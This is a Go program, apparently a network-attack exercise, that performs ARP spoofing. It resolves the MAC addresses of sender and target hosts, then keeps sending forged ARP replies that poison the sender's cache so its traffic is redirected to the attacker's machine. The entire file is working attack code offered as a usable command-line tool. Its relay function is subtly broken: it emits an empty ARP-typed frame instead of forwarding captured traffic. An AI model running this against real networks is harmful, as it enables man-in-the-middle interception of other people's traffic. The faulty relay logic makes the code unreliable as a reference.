package main

import (
	"fmt"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const BUFSIZ int32 = 512

var wg sync.WaitGroup

var attackerIP net.IP
var attackerMAC net.HardwareAddr

var senderMAC net.HardwareAddr
var targetMAC net.HardwareAddr

var senderIPs []net.IP
var targetIPs []net.IP

func getAttackerIP() net.IP {
	if addrs, err := net.InterfaceAddrs(); err != nil {
		panic(err)
	} else {
		for _, addr := range addrs {
			ipNet, ok := addr.(*net.IPNet)
			if ok && !ipNet.IP.IsLoopback() && ipNet.IP.To4() != nil {
				return ipNet.IP
			}
		}
		panic("Cannot get local IP address")
	}
}

func getAttackerMAC(intf string) net.HardwareAddr {
	if netIntf, err := net.InterfaceByName(intf); err != nil {
		panic(err)
	} else {
		return netIntf.HardwareAddr
	}
}

func buildNormalARPRequest(ip net.IP) []byte {
	ethLayer := &layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       layers.EthernetBroadcast,
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   attackerMAC,
		SourceProtAddress: attackerIP.To4(),
		DstHwAddress:      net.HardwareAddr{0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
		DstProtAddress:    ip.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts, ethLayer, arpLayer)
	return buf.Bytes()
}

func buildInfectionARPReply(index int) []byte {
	ethLayer := &layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       senderMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	arpLayer := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   attackerMAC,
		SourceProtAddress: targetIPs[index].To4(),
		DstHwAddress:      senderMAC,
		DstProtAddress:    senderIPs[index].To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts, ethLayer, arpLayer)
	return buf.Bytes()
}

func buildRelayPacket() []byte {
	ethLayer := &layers.Ethernet{
		SrcMAC:       attackerMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeARP,
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{}
	gopacket.SerializeLayers(buf, opts, ethLayer)
	return buf.Bytes()
}

func poison(handle *pcap.Handle, index int) {
	for {
		infectionARPReply := buildInfectionARPReply(index)
		if err := handle.WritePacketData(infectionARPReply); err != nil {
			panic("Error sending packet to network device")
		} else {
			fmt.Printf("[+] Successfully poisoned ARP cache\n")
		}
		time.Sleep(time.Second * 10)
	}
}

func spoof(handle *pcap.Handle, index int) {
	defer wg.Done()
	normalARPRequest := buildNormalARPRequest(senderIPs[index])
	if err := handle.WritePacketData(normalARPRequest); err != nil {
		panic("Error sending packet to network device")
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
				arp, _ := arpLayer.(*layers.ARP)
				if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
					senderMAC = arp.SourceHwAddress
					break
				}
			}
		}
	}
	fmt.Printf("[+] Successfully got MAC address of %s\n", senderIPs[index])
	fmt.Printf("senderMAC: %s\n", senderMAC) // !debug

	normalARPRequest = buildNormalARPRequest(targetIPs[index])
	if err := handle.WritePacketData(normalARPRequest); err != nil {
		panic("Error sending packet to network device")
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {
			if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
				arp, _ := arpLayer.(*layers.ARP)
				if arp.Operation == layers.ARPReply && string(arp.DstHwAddress) == string(attackerMAC) {
					targetMAC = arp.SourceHwAddress
					break
				}
			}
		}
	}
	fmt.Printf("[+] Successfully got MAC address of %s\n", targetIPs[index])
	fmt.Printf("targetMAC: %s\n", targetMAC) // !debug

	go poison(handle, index)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if ethLayer := packet.Layer(layers.LayerTypeEthernet); ethLayer != nil {
			eth, _ := ethLayer.(*layers.Ethernet)
			if string(eth.SrcMAC) == string(senderMAC) {
				relay := buildRelayPacket()
				if err := handle.WritePacketData(relay); err != nil {
					panic("Error sending packet to network device")
				} else {
					fmt.Printf("[+] Successfully relayed packet to target\n")
				}
			}
		}
	}
}

func main() {
	if len(os.Args) < 4 {
		fmt.Printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n")
		fmt.Printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n")
		panic("Invalid usage")
	}

	var intf string = os.Args[1]

	for i := 2; i < len(os.Args); i++ {
		ipAddr := net.ParseIP(os.Args[i])
		if ipAddr == nil {
			fmt.Printf("Invalid format of IP address: %s\n", os.Args[i])
			panic("Invalid IP format")
		}
		if i%2 == 0 {
			senderIPs = append(senderIPs, ipAddr)
		} else {
			targetIPs = append(targetIPs, ipAddr)
		}
	}

	if len(senderIPs) != len(targetIPs) {
		fmt.Printf("Invalid matching of IP pairs: %d sender ips, %d target ips\n", len(senderIPs), len(targetIPs))
		panic("Invalid IP pair matching")
	}

	attackerIP = getAttackerIP()
	fmt.Printf("attackerIP: %s\n", attackerIP) // !debug
	attackerMAC = getAttackerMAC(intf)
	fmt.Printf("attackerMAC: %s\n", attackerMAC) // !debug

	if handle, err := pcap.OpenLive(intf, BUFSIZ, true, time.Second); err != nil {
		fmt.Printf("couldn't open device %s\n", intf)
		panic(err)
	} else {
		n := len(senderIPs)
		wg.Add(n)
		for i := range n {
			go spoof(handle, i)
		}
	}

	wg.Wait()
}
